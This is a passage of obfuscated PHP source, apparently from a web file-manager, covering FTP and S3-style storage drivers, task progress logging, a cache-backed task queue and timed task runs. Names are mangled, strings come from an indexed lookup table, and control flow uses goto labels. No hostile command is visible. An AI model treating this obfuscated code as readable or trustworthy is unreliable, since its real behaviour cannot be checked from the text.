($¡¡Ğ›ì° == FTP_MOREDATA) { $¡¡Ğ›ì° = ftp_nb_continue($this->connect); } if ($¡¡Ğ›ì° != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } return $this->getPathOuter($ãµÔÇï); } public function download($…Úîµ¤í, $‘Ìˆ•Šâ = '') { if (!$this->_isconn()) { return !1; } $û°Úõç‹ = $this->pathFather($‘Ìˆ•Šâ); if (!IO::mkdir($û°Úõç‹)) { return !1; } $…Úîµ¤í = $this->iconvSystem($…Úîµ¤í); $‘Ìˆ•Šâ = $this->iconvSystem($‘Ìˆ•Šâ); $¯ùàô›¨ = ftp_nb_get($this->connect, $‘Ìˆ•Šâ, $…Úîµ¤í, FTP_BINARY); while ($¯ùàô›¨ == FTP_MOREDATA) { $¯ùàô›¨ = ftp_nb_continue($this->connect); } if ($¯ùàô›¨ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } return $this->iconvApp($‘Ìˆ•Šâ); } public function exist($¡ãÎœ¦å) { return $this->isFile($¡ãÎœ¦å) || $this->isFolder($¡ãÎœ¦å); } public function isFile($áŠæªŠÕ) { return !$this->isFolder($áŠæªŠÕ) && $this->objectMeta($áŠæªŠÕ); } public function isFolder($ÍĞñÊÀ«) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][180], $ÍĞñÊÀ«); } protected function objectMeta($îòí¯Š) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][182], $îòí¯Š); } protected function _objectMeta($ß°‹ó˜) { $ª˜á‰¾² =& $_SERVER[åÄ¼Ùßš]; if ($ß°‹ó˜ == $ª˜á‰¾²[12] || $ß°‹ó˜ == $ª˜á‰¾²[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ß°‹ó˜ = $this->iconvSystem($ß°‹ó˜); $¬†Š¶å = array($ª˜á‰¾²[32] => $this->iconvApp($ß°‹ó˜), $ª˜á‰¾²[33] => $ª˜á‰¾²[233], $ª˜á‰¾²[79] => 0); $òĞ±èà´ = @ftp_size($this->connect, $ß°‹ó˜); if ($òĞ±èà´ != -1) { $¬†Š¶å[$ª˜á‰¾²[79]] = $òĞ±èà´; } else { $–Œ™¹¿š = @ftp_chdir($this->connect, $ß°‹ó˜); if (!$–Œ™¹¿š) { return !1; } @ftp_chdir($this->connect, $ª˜á‰¾²[8]); $¬†Š¶å[$ª˜á‰¾²[33]] = $ª˜á‰¾²[78]; } return $¬†Š¶å; } protected function _isFolder($æ’€ª¦–) { $Ó–÷æşõ =& $_SERVER[åÄ¼Ùßš]; if ($æ’€ª¦– == $Ó–÷æşõ[12] || $æ’€ª¦– == $Ó–÷æşõ[8]) { return !0; } $ÕŞ§£ù = $this->_objectMeta($æ’€ª¦–); return isset($ÕŞ§£ù[$Ó–÷æşõ[33]]) && $ÕŞ§£ù[$Ó–÷æşõ[33]] == $Ó–÷æşõ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($èíèš) { parent::__construct($èíèš); $this->setSignVersion($_SERVER[åÄ¼Ùßš][250]); } public function uploadLink($»ÈŠ²œ, $œ„¯£– = 0) { $•ÉûéÔı =& $_SERVER[åÄ¼Ùßš]; if ($this->isUploadServer()) { return; } $¨³û¦ëº = $this->getType(); if (!in_array($¨³û¦ëº, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÂööŒàÊ = (!$œ„¯£– ? 1 : ceil($œ„¯£– / pow(1024, 3))) * 3600 * 4; $î¢æ‰ûİ = $this->uploadMultiData($»ÈŠ²œ, $ÂööŒàÊ); if ($î¢æ‰ûİ) { $î¢æ‰ûİ[$•ÉûéÔı[97]] = $»ÈŠ²œ; $î¢æ‰ûİ[$•ÉûéÔı[98]] = $¨³û¦ëº; } return $î¢æ‰ûİ; } public function fileOutImage($µ’Ëå¾ç, $È·‰­©· = 250) { if ($this->size($µ’Ëå¾ç) > 1024 * 1024 * 25) { return $this->fileOutImageServer($µ’Ëå¾ç, $È·‰­©·); } $íĞı×¿ = $this->link($µ’Ëå¾ç); $íĞı×¿ .= $_SERVER[åÄ¼Ùßš][1499] . $È·‰­©·; $this->fileOutLink($íĞı×¿); } } goto f‚­ÈÂÓ; a¡Ü“ë¤ñ: class TaskHttp extends Task { protected function startAfter() { $õŒçê¾ =& $_SERVER[åÄ¼Ùßš]; $ŸÕòÎ =& $this->task; $ŸÕòÎ[$õŒçê¾[1895]] = 1; Hook::bind($õŒçê¾[1863], array($this, $õŒçê¾[1896])); Hook::bind($õŒçê¾[1865], array($this, $õŒçê¾[1897])); Hook::bind($õŒçê¾[1867], array($this, $õŒçê¾[1898])); } protected function endAfter() { $Ù€À±Õ =& $_SERVER[åÄ¼Ùßš]; Hook::unbind($Ù€À±Õ[1863], array($this, $Ù€À±Õ[1896])); Hook::unbind($Ù€À±Õ[1865], array($this, $Ù€À±Õ[1897])); Hook::unbind($Ù€À±Õ[1867], array($this, $Ù€À±Õ[1898])); } public function progressStart($ŠõÈù¾·) { $É£–Şß =& $_SERVER[åÄ¼Ùßš]; $±¤¯ƒï³ = curl_getinfo($ŠõÈù¾·); self::log($É£–Şß[1899] . $±¤¯ƒï³[$É£–Şß[384]]); self::valueSet($this->task[$É£–Şß[484]], $this->task); } public function progressEnd($«¹¶Ÿ’´) { $ª¾Òœ =& $_SERVER[åÄ¼Ùßš]; self::log($ª¾Òœ[1900] . $this->task[$ª¾Òœ[484]]); $this->end(); } public function progress($íÛã×Ê·, $¢˜ıõŸ®, $ãı€Û¡”, $ŒÌ÷†´, $ïÛ¸œÒ) { $™¡ÍÎÚü =& $_SERVER[åÄ¼Ùßš]; $€ÆõõÀ =& $this->task; if ($ïÛ¸œÒ > 0) { $€ÆõõÀ[$™¡ÍÎÚü[1171]] = $€ÆõõÀ[$™¡ÍÎÚü[1171]] == 0 ? $ŒÌ÷†´ : $€ÆõõÀ[$™¡ÍÎÚü[1171]]; $€ÆõõÀ[$™¡ÍÎÚü[1818]] = $ïÛ¸œÒ; } else { if ($ãı€Û¡” > 0) { $€ÆõõÀ[$™¡ÍÎÚü[1171]] = $€ÆõõÀ[$™¡ÍÎÚü[1171]] == 0 ? $¢˜ıõŸ® : $€ÆõõÀ[$™¡ÍÎÚü[1171]]; $€ÆõõÀ[$™¡ÍÎÚü[1818]] = $ãı€Û¡”; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\163\163\x48\164\164\x70\72\x64\x6f\167\x6e\72{$ãı€Û¡”}\x2f{$¢˜ıõŸ®}\73\40\x75\160\x6c\x6f\141\144\72{$ïÛ¸œÒ}\57{$ŒÌ÷†´}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÀößÏ¦÷, $»ôĞıÉº = '', $ºìçÛò‚ = 0, $½Ÿœœœí = '') { $ŸÙÆÎ› =& $_SERVER[åÄ¼Ùßš]; $½Ÿœœœí = $½Ÿœœœí ? $½Ÿœœœí : ($»ôĞıÉº ? $»ôĞıÉº : $ÀößÏ¦÷); $µéĞÉ = new Task($ÀößÏ¦÷, $»ôĞıÉº, $ºìçÛò‚, $½Ÿœœœí); $GLOBALS[$ŸÙÆÎ›[1901] . $ÀößÏ¦÷] = new TaskLog($ŸÙÆÎ›[1800], $µéĞÉ, $½Ÿœœœí); return $µéĞÉ; } public function __construct($É¿Ø¦…Û = '', $œ‚éßÊğ = '', $•ÕÃÔÜ¨ = '') { $ş­¿Õ³ =& $_SERVER[åÄ¼Ùßš]; if (!$É¿Ø¦…Û) { $É¿Ø¦…Û = $ş­¿Õ³[1800]; } $’Ğş…¾ä = $É¿Ø¦…Û . $ş­¿Õ³[474] . rand_string(10); if (!$•ÕÃÔÜ¨) { $•ÕÃÔÜ¨ = $É¿Ø¦…Û . $ş­¿Õ³[53] . $•ÕÃÔÜ¨; } switch ($É¿Ø¦…Û) { case $ş­¿Õ³[1800]: if (!$œ‚éßÊğ || !$œ‚éßÊğ->task) { return echoLog($É¿Ø¦…Û . $ş­¿Õ³[1902]); } $£‚Ö¼“¹ = $œ‚éßÊğ; $’Ğş…¾ä = $£‚Ö¼“¹->task[$ş­¿Õ³[484]]; $É¿Ø¦…Û = $£‚Ö¼“¹->task[$ş­¿Õ³[484]]; if (!$£‚Ö¼“¹->task[$ş­¿Õ³[1704]]) { $£‚Ö¼“¹->task[$ş­¿Õ³[1704]] = $•ÕÃÔÜ¨ ? $•ÕÃÔÜ¨ : $É¿Ø¦…Û; } break; case $ş­¿Õ³[1903]: if (!$œ‚éßÊğ) { return echoLog($É¿Ø¦…Û . $ş­¿Õ³[1904]); } $Ù¯´±ó¼ = is_string($œ‚éßÊğ) ? array($œ‚éßÊğ) : $œ‚éßÊğ; $£‚Ö¼“¹ = new TaskFileTransfer($’Ğş…¾ä, $É¿Ø¦…Û, 0, $•ÕÃÔÜ¨ ? $•ÕÃÔÜ¨ : $Ù¯´±ó¼[0]); foreach ($Ù¯´±ó¼ as $Š¬šğ‹¡) { $£‚Ö¼“¹->addPath($Š¬šğ‹¡); } break; case $ş­¿Õ³[390]: if (!$œ‚éßÊğ) { return echoLog($É¿Ø¦…Û . $ş­¿Õ³[1904]); } $Ù¯´±ó¼ = is_string($œ‚éßÊğ) ? array($œ‚éßÊğ) : $œ‚éßÊğ; $£‚Ö¼“¹ = new TaskZip($’Ğş…¾ä, $É¿Ø¦…Û, 0, $•ÕÃÔÜ¨ ? $•ÕÃÔÜ¨ : $Ù¯´±ó¼[0]); foreach ($Ù¯´±ó¼ as $Š¬šğ‹¡) { $£‚Ö¼“¹->addPath($Š¬šğ‹¡); } break; case $ş­¿Õ³[1337]: if (!$œ‚éßÊğ) { return echoLog($É¿Ø¦…Û . $ş­¿Õ³[1904]); } $£‚Ö¼“¹ = new TaskUnZip($’Ğş…¾ä, $É¿Ø¦…Û, 0, $•ÕÃÔÜ¨ ? $•ÕÃÔÜ¨ : $œ‚éßÊğ); if ($œ‚éßÊğ) { $£‚Ö¼“¹->addFile($œ‚éßÊğ); } break; case $ş­¿Õ³[152]: $£‚Ö¼“¹ = new TaskHttp($’Ğş…¾ä, $É¿Ø¦…Û); break; default: return; break; } $this->task = $£‚Ö¼“¹; $this->taskID = $’Ğş…¾ä; Hook::bind($ş­¿Õ³[1838], array($this, $ş­¿Õ³[1905])); Hook::bind($ş­¿Õ³[1840], array($this, $ş­¿Õ³[1906])); Hook::bind($ş­¿Õ³[1834], array($this, $ş­¿Õ³[1907])); echoLog($ş­¿Õ³[1908] . $£‚Ö¼“¹->task[$ş­¿Õ³[1704]]); } public function __destruct() { $this->end(); } public function end($ğÜéëİØ = '') { $Ş”“øÈú =& $_SERVER[åÄ¼Ùßš]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ğÜéëİØ); $this->task = !1; $this->taskID = !1; Hook::unbind($Ş”“øÈú[1838], array($this, $Ş”“øÈú[1905])); Hook::unbind($Ş”“øÈú[1840], array($this, $Ş”“øÈú[1906])); Hook::unbind($Ş”“øÈú[1834], array($this, $Ş”“øÈú[1907])); } public function taskUpdate($¬èºØ†) { $‘‘œìõ =& $_SERVER[åÄ¼Ùßš]; if (!$¬èºØ† || $this->taskID != $¬èºØ†[$‘‘œìõ[484]]) { return; } $ŞüÂŞ = 20; $²‡“ºÜ… = intval($¬èºØ†[$‘‘œìõ[1819]] * $ŞüÂŞ); $† Ìşá = $‘‘œìõ[176] . str_repeat($‘‘œìõ[465], $²‡“ºÜ…) . $‘‘œìõ[1122] . str_repeat($‘‘œìõ[53], $ŞüÂŞ - $²‡“ºÜ…) . $‘‘œìõ[178]; $œ¯ïİÒ– = $† Ìşá . sprintf($‘‘œìõ[1909], $¬èºØ†[$‘‘œìõ[1819]] * 100) . $‘‘œìõ[1910]; $ÓÈ÷çÌâ = $œ¯ïİÒ– . $¬èºØ†[$‘‘œìõ[1818]] . $‘‘œìõ[8] . $¬èºØ†[$‘‘œìõ[1171]] . LNG($‘‘œìõ[1911]); $îüéíøÀ = $‘‘œìõ[12]; if ($¬èºØ†[$‘‘œìõ[1895]]) { $ÓÈ÷çÌâ = $œ¯ïİÒ– . size_format($¬èºØ†[$‘‘œìõ[1818]]) . $‘‘œìõ[8] . size_format($¬èºØ†[$‘‘œìõ[1171]]); $îüéíøÀ = size_format($¬èºØ†[$‘‘œìõ[1820]]) . $‘‘œìõ[1912]; } if ($¬èºØ†[$‘‘œìõ[1173]]) { $¬èºØ†[$‘‘œìõ[1869]] = $¬èºØ†[$‘‘œìõ[1173]] . $‘‘œìõ[53] . $¬èºØ†[$‘‘œìõ[1869]]; } if ($¬èºØ†[$‘‘œìõ[1869]]) { $ÓÜ‹§–š = $‘‘œìõ[12]; if ($¬èºØ†[$‘‘œìõ[1871]]) { $ÓÜ‹§–š = $‘‘œìõ[50] . size_format($¬èºØ†[$‘‘œìõ[1872]]) . $‘‘œìõ[8] . size_format($¬èºØ†[$‘‘œìõ[1871]]); } $îüéíøÀ .= $¬èºØ†[$‘‘œìõ[1869]] . $ÓÜ‹§–š; } if ($¬èºØ†[$‘‘œìõ[857]] && !$¬èºØ†[$‘‘œìõ[1871]]) { $îüéíøÀ .= $‘‘œìõ[53] . size_format($¬èºØ†[$‘‘œìõ[1876]]) . $‘‘œìõ[8] . size_format($¬èºØ†[$‘‘œìõ[857]]); } echoLog($ÓÈ÷çÌâ . $‘‘œìõ[53] . $îüéíøÀ, !0); } public function taskEnd($ÔÛÔÀü¾) { $ÅìÎµŒŸ =& $_SERVER[åÄ¼Ùßš]; if (!$ÔÛÔÀü¾ || $this->taskID != $ÔÛÔÀü¾[$ÅìÎµŒŸ[484]]) { return; } $†Üó×ó = $ÔÛÔÀü¾ ? LNG($ÅìÎµŒŸ[1913]) . $ÅìÎµŒŸ[4] . $ÔÛÔÀü¾[$ÅìÎµŒŸ[1818]] . $ÅìÎµŒŸ[8] . $ÔÛÔÀü¾[$ÅìÎµŒŸ[1171]] . LNG($ÅìÎµŒŸ[1911]) . $ÅìÎµŒŸ[74] : $ÅìÎµŒŸ[12]; echoLog($ÅìÎµŒŸ[1914] . $ÔÛÔÀü¾[$ÅìÎµŒŸ[1704]] . ($ÔÛÔÀü¾[$ÅìÎµŒŸ[537]] ? $ÅìÎµŒŸ[74] . $ÔÛÔÀü¾[$ÅìÎµŒŸ[537]] : $ÅìÎµŒŸ[12]) . $ÅìÎµŒŸ[74] . $†Üó×ó . $ÅìÎµŒŸ[1915] . sprintf($ÅìÎµŒŸ[956], timeFloat() - $ÔÛÔÀü¾[$ÅìÎµŒŸ[1821]]) . $ÅìÎµŒŸ[1833]); $this->end(); } public function taskKill($°ºÊ¥ø¦) { $Š¿ˆ§’‹ =& $_SERVER[åÄ¼Ùßš]; if (!$°ºÊ¥ø¦ || $this->taskID != $°ºÊ¥ø¦[$Š¿ˆ§’‹[484]]) { return; } echoLog($Š¿ˆ§’‹[1916] . $°ºÊ¥ø¦[$Š¿ˆ§’‹[1704]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\121\165\x65\x75\x65\114\145\x6e\147\x74\150"; const QUEUE_DATA = "\164\141\163\153\x51\x75\x65\x75\x65\x44\141\164\141"; const QUEUE_TIME = "\164\141\x73\x6b\121\165\x65\165\x65\x4c\141\x73\x74\x52\x75\156"; const QUEUE_THREAD = "\164\141\x73\153\x51\165\x65\x75\145\x54\150\162\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($æÒ½şØ, $½ùØÅ¼« = array(), $Ğ°„ÈÚó = '', $—µÂ = '') { $úéøËş =& $_SERVER[åÄ¼Ùßš]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($—µÂ && array_find_by_field(self::$listData, $úéøËş[97], $—µÂ)) { return !0; } if ($—µÂ && array_find_by_field(self::$listDataAdd, $úéøËş[97], $—µÂ)) { return !0; } self::$listDataAdd[] = array($úéøËş[344] => $æÒ½şØ, $úéøËş[1917] => $½ùØÅ¼«, $úéøËş[537] => $Ğ°„ÈÚó, $úéøËş[97] => $—µÂ); return !0; } public static function addSubmit() { $ë° ùã =& $_SERVER[åÄ¼Ùßš]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ë° ùã[1918] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ë° ùã[12], $ë° ùã[537])), $ë° ùã[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ºåŞÛ¥¤, $¬·±Êúı = array(), $î–ïƒ¥ = '', $®ñÊéã  = '') { $º‘˜¼‚á =& $_SERVER[åÄ¼Ùßš]; if (self::count() >= self::MAX_LENGTH) { return !1; } $İéÒæ“å = self::getAll(); if ($®ñÊéã  && array_find_by_field($İéÒæ“å, $º‘˜¼‚á[97], $®ñÊéã )) { return !0; } $İéÒæ“å[] = array($º‘˜¼‚á[344] => $ºåŞÛ¥¤, $º‘˜¼‚á[1917] => $¬·±Êúı, $º‘˜¼‚á[537] => $î–ïƒ¥, $º‘˜¼‚á[97] => $®ñÊéã ); self::setAll($İéÒæ“å); write_log($º‘˜¼‚á[1918] . $î–ïƒ¥, $º‘˜¼‚á[198]); return !0; } public static function run() { $öıïÎ‰‹ =& $_SERVER[åÄ¼Ùßš]; $‚ŞÕûØİ = self::getAll(); $“ó›¥ˆ° = array_shift($‚ŞÕûØİ); if (!$“ó›¥ˆ°) { return !1; } self::setAll($‚ŞÕûØİ); $Ã©Òã™ß = timeFloat(); $çÂ¦‰â× = $öıïÎ‰‹[12]; try { $çÂ¦‰â× = Hook::apply($“ó›¥ˆ°[$öıïÎ‰‹[344]], $“ó›¥ˆ°[$öıïÎ‰‹[1917]]); } catch (Exception $Ãû™ÜÚ¨) { write_log($Ãû™ÜÚ¨, $öıïÎ‰‹[1302]); } $‚ÍŠÀÌš = number_format(timeFloat() - $Ã©Òã™ß, 3) . $öıïÎ‰‹[1833]; if ($çÂ¦‰â× && is_string($çÂ¦‰â×)) { $‚ÍŠÀÌš = $‚ÍŠÀÌš . $öıïÎ‰‹[1919] . $çÂ¦‰â×; } write_log($öıïÎ‰‹[1920] . $“ó›¥ˆ°[$öıïÎ‰‹[537]] . $öıïÎ‰‹[1921] . $‚ÍŠÀÌš, $öıïÎ‰‹[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $”ü¼¢Å =& $_SERVER[åÄ¼Ùßš]; $•˜¤ó‹ = self::threadCount() + 1; if ($•˜¤ó‹ > 3 || !self::count()) { return; } write_log($”ü¼¢Å[1922] . $•˜¤ó‹, $”ü¼¢Å[198]); Cache::set(self::QUEUE_THREAD, $•˜¤ó‹, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($”ü¼¢Å[1923], $”ü¼¢Å[198]); } public static function getKey($ğÈ˜ÁâØ, $Æ‘¡™™ = "\x69\x6e\164") { $“é¡åş³ =& $_SERVER[åÄ¼Ùßš]; Cache::removeMemory($ğÈ˜ÁâØ); $‘Éà‘—” = Cache::get($ğÈ˜ÁâØ); if ($Æ‘¡™™ == $“é¡åş³[366]) { return $‘Éà‘—” ? intval($‘Éà‘—”) : 0; } if ($Æ‘¡™™ == $“é¡åş³[1924]) { return is_array($‘Éà‘—”) ? $‘Éà‘—” : array(); } return $‘Éà‘—”; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[åÄ¼Ùßš][1924]); } public static function setAll($¥‘›ú»ª) { $‹ÁïÒ¡µ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¥‘›ú»ª), $‹ÁïÒ¡µ); Cache::set(self::QUEUE_DATA, $¥‘›ú»ª, $‹ÁïÒ¡µ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto Aˆ°Ø‹ ¦‹; fÑÊ¯›‘ÑŞ: function binCheckBigger($ÍÑöäÏ¸, $ÉÚˆßÚÊ) { return $ÍÑöäÏ¸ > $ÉÚˆßÚÊ; } $_SERVER[$_SERVER[³Ì„‘öã][3]] = ("\70\70\62\66"."\60\63")+0;$_bzcy="pzt967g4mhjkb83a1fr0d5wqs2inyvlcoxeuwnq73s6re85tjydzlkoxi4v1pmha02fbgcu9erfh913opw";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¹·ÃÆ¿, $—Ğ˜»Ÿ©) { $¯¡ü“ƒŸ =& $_SERVER[åÄ¼Ùßš]; if (isset(self::$_methodList[$¹·ÃÆ¿])) { return @call_user_func_array(self::$_methodList[$¹·ÃÆ¿], $—Ğ˜»Ÿ©); } else { if (method_exists($this, $¹·ÃÆ¿)) { return call_user_func_array(array($this, $¹·ÃÆ¿), $—Ğ˜»Ÿ©); } else { think_exception(__CLASS__ . $¯¡ü“ƒŸ[4] . $¹·ÃÆ¿ . $¯¡ü“ƒŸ[5]); } } } public static function __callStatic($×´Å»«¶, $…§Šé¸÷) { if (isset(self::$_methodListStatic[$×´Å»«¶])) { return call_user_func_array(self::$_methodListStatic[$×´Å»«¶], $…§Šé¸÷); } else { if (method_exists(self, $×´Å»«¶)) { return call_user_func_array(array(self, $×´Å»«¶), $…§Šé¸÷); } else { show_json("{$×´Å»«¶}\50\51\40\156\157\164\x20\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($äï˜ÏÂ‰, $Ö³ƒ šÖ) { self::$_methodList[$äï˜ÏÂ‰] = $Ö³ƒ šÖ; } public static function addMethodStatic($×ªÊåç, $„Áàò¬Ñ) { self::$_methodListStatic[$×ªÊåç] = $„Áàò¬Ñ; } } goto a—Á™šÁ†—; Aˆ°Ø‹ ¦‹: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($øÒ·§ŸÓ, $¥â¯ñ‡ê = 5.0) { if (!$øÒ·§ŸÓ) { return; } $æ•šÑºå = Cache::get($øÒ·§ŸÓ); if (!$æ•šÑºå || timeFloat() - floatVal($æ•šÑºå) >= $¥â¯ñ‡ê) { Cache::set($øÒ·§ŸÓ, timeFloat(), $¥â¯ñ‡ê * 10); return !0; } return !1; } public static function timeLimitCall($™Ê®‡åş, $ÙÅ§›â, $—Ó£ãş©, $Ôâ‰„× = 5.0) { $‹æÖÍò• =& $_SERVER[åÄ¼Ùßš]; if (!$™Ê®‡åş || !$ÙÅ§›â) { return; } self::$asyncAdd = !0; $‚üä„¤½ = $‹æÖÍò•[1925]; $¾æÑ…‡° = Cache::get($‚üä„¤½, !0); $Ó˜Ú¦£Ù = array($‹æÖÍò•[1926] => timeFloat(), $‹æÖÍò•[1927] => timeFloat(), $‹æÖÍò•[344] => $ÙÅ§›â, $‹æÖÍò•[1917] => $—Ó£ãş©, $‹æÖÍò•[1928] => $Ôâ‰„×); if (is_array($¾æÑ…‡°[$™Ê®‡åş])) { if (timeFloat() - $¾æÑ…‡°[$™Ê®‡åş][$‹æÖÍò•[1926]] <= $Ó˜Ú¦£Ù[$‹æÖÍò•[1928]] * 0.5) { return; } $Ó˜Ú¦£Ù[$‹æÖÍò•[1927]] = $¾æÑ…‡°[$™Ê®‡åş][$‹æÖÍò•[1927]]; } $¾æÑ…‡°[$™Ê®‡åş] = $Ó˜Ú¦£Ù; Cache::set($‚üä„¤½, $¾æÑ…‡°, 60); Cache::removeMemory($‚üä„¤½); write_log($‹æÖÍò•[1929] . $™Ê®‡åş . $‹æÖÍò•[74] . $ÙÅ§›â . $‹æÖÍò•[1930] . ACTION, $‹æÖÍò•[198]); } public static function timeLimitCallLoop() { $•ö‡ÚÅ¬ =& $_SERVER[åÄ¼Ùßš]; $êŒ¢Ëç• = array($•ö‡ÚÅ¬[1931]); $ğÈû«Ò§ = in_array(strtolower(ACTION), $êŒ¢Ëç•); if (!$ğÈû«Ò§ && !self::$asyncAdd) { return; } $ãØ’¥è = $•ö‡ÚÅ¬[1925]; $±€ÛÀ˜ç = Cache::get($ãØ’¥è, !0); if (!$±€ÛÀ˜ç || count($±€ÛÀ˜ç) <= 0) { return; } $È×µ¥ÊÄ = timeFloat(); $õÜàß¹ = array(); $ó™µÅØ = array(); foreach ($±€ÛÀ˜ç as $ºĞ£Ç¡ => $ ‘ûÃé) { if ($È×µ¥ÊÄ - $ ‘ûÃé[$•ö‡ÚÅ¬[1927]] > $ ‘ûÃé[$•ö‡ÚÅ¬[1928]]) { $ó™µÅØ[$ºĞ£Ç¡] = $ ‘ûÃé; continue; } $õÜàß¹[$ºĞ£Ç¡] = $ ‘ûÃé; } if (count($ó™µÅØ) == 0) { return; } if (count($õÜàß¹) == 0) { Cache::remove($ãØ’¥è); } else { Cache::set($ãØ’¥è, $õÜàß¹, 60); } Cache::removeMemory($ãØ’¥è); self::runArr($ó™µÅØ); } public static function finished($¯¨¶ß¼Î, $îÏàøÀ¢) { $¤½Ì©û© =& $_SERVER[åÄ¼Ùßš]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¤½Ì©û©[344] => $¯¨¶ß¼Î, $¤½Ì©û©[1917] => $îÏàøÀ¢); } private static function runArr($ËŞİ¦§) { $¯î„…Û =& $_SERVER[åÄ¼Ùßš]; if (!$ËŞİ¦§) { return; } foreach ($ËŞİ¦§ as $ïú¼šÎá => $é¥Ùã) { try { Hook::apply($é¥Ùã[$¯î„…Û[344]], $é¥Ùã[$¯î„…Û[1917]]); write_log($¯î„…Û[1932] . $ïú¼šÎá . $¯î„…Û[74] . $é¥Ùã[$¯î„…Û[344]] . $¯î„…Û[1930] . ACTION, $¯î„…Û[198]); } catch (Exception $æÍËÍ§ˆ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $’ç© — =& $_SERVER[åÄ¼Ùßš]; parent::startAfter(); Hook::bind($’ç© —[1933], array($this, $’ç© —[1934])); Hook::bind($’ç© —[1316], array($this, $’ç© —[1935])); Hook::bind($’ç© —[1936], array($this, $’ç© —[1937])); $áÖ§¸ßß =& $this->task; $áÖ§¸ßß[$’ç© —[1938]] = $’ç© —[1317]; if (!$áÖ§¸ßß[$’ç© —[1704]]) { $áÖ§¸ßß[$’ç© —[1704]] = LNG($’ç© —[1939]); } } protected function endAfter() { $÷òÄ¹’ =& $_SERVER[åÄ¼Ùßš]; parent::endAfter(); Hook::unbind($÷òÄ¹’[1933], array($this, $÷òÄ¹’[1934])); Hook::unbind($÷òÄ¹’[1316], array($this, $÷òÄ¹’[1935])); Hook::unbind($÷òÄ¹’[1936], array($this, $÷òÄ¹’[1937])); } public function updateAfter() { $ÎÒ Ş®¬ =& $_SERVER[åÄ¼Ùßš]; $âÜÜí¹è =& $this->task; if (!$âÜÜí¹è[$ÎÒ Ş®¬[1171]] || !$âÜÜí¹è[$ÎÒ Ş®¬[857]]) { if ($âÜÜí¹è[$ÎÒ Ş®¬[1938]] != $ÎÒ Ş®¬[390]) { return; } } if ($âÜÜí¹è[$ÎÒ Ş®¬[1938]] == $ÎÒ Ş®¬[1317]) { $÷àĞŸ¯ğ = 0; if ($âÜÜí¹è[$ÎÒ Ş®¬[1871]]) { $÷àĞŸ¯ğ = $âÜÜí¹è[$ÎÒ Ş®¬[1872]] / $âÜÜí¹è[$ÎÒ Ş®¬[1871]]; } $âÜÜí¹è[$ÎÒ Ş®¬[1819]] = $÷àĞŸ¯ğ * 0.3; } else { if ($âÜÜí¹è[$ÎÒ Ş®¬[1938]] == $ÎÒ Ş®¬[390]) { $÷àĞŸ¯ğ = $âÜÜí¹è[$ÎÒ Ş®¬[1818]] / $âÜÜí¹è[$ÎÒ Ş®¬[1171]]; $âÜÜí¹è[$ÎÒ Ş®¬[1819]] = 0.3 + $÷àĞŸ¯ğ * 0.4; } else { if ($âÜÜí¹è[$ÎÒ Ş®¬[1938]] == $ÎÒ Ş®¬[110]) { $ÁøÚ”ç = 0; if ($âÜÜí¹è[$ÎÒ Ş®¬[1873]] == $ÎÒ Ş®¬[110]) { $ÁøÚ”ç = $âÜÜí¹è[$ÎÒ Ş®¬[1872]]; } $÷àĞŸ¯ğ = ($âÜÜí¹è[$ÎÒ Ş®¬[1876]] + $ÁøÚ”ç) / $âÜÜí¹è[$ÎÒ Ş®¬[857]]; $âÜÜí¹è[$ÎÒ Ş®¬[1819]] = 0.3 + 0.4 + $÷àĞŸ¯ğ * 0.3; } } } if ($âÜÜí¹è[$ÎÒ Ş®¬[1819]] > 0) { $‡‰“”»“ = timeFloat() - $âÜÜí¹è[$ÎÒ Ş®¬[1821]] - $âÜÜí¹è[$ÎÒ Ş®¬[1824]]; $âÜÜí¹è[$ÎÒ Ş®¬[1825]] = $‡‰“”»“ * (1 - $âÜÜí¹è[$ÎÒ Ş®¬[1819]]) / $âÜÜí¹è[$ÎÒ Ş®¬[1819]]; } } public function addFile($Ó™ÚúŸ¿) { $ä†ÑÂü± =& $_SERVER[åÄ¼Ùßš]; $Çö £‹å =& $this->task; $•È„Á¹¼ = IO::info($Ó™ÚúŸ¿); $Çö £‹å[$ä†ÑÂü±[1869]] = $•È„Á¹¼[$ä†ÑÂü±[32]]; $Çö £‹å[$ä†ÑÂü±[1871]] = 